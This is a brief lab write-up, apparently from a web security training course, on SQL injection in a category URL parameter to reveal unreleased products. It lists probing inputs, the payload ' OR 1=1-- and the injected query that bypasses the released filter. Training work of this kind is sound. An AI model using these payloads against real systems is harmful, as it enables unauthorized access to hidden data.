# Lab 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

## Goal: Exploit SQLi in category filter to view unreleased products.

Vulnerability Analysis
- Parameter : category in URL
- Original Query :

```bash
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
- Testing Vulnerability : 
```bash 
category='
#internal server error → SQLi exists

category='--
#no error → comment closes query

category=' OR 1=1--
```
Injected Query
```bash
SELECT * FROM products WHERE category = '' OR 1=1 -- ' AND released = 1;
```
This bypasses the released = 1 restriction → shows hidden products.

Key Learning
```bash
--  #comments out remaining query
OR 1=1 #always evaluates to TRUE
```
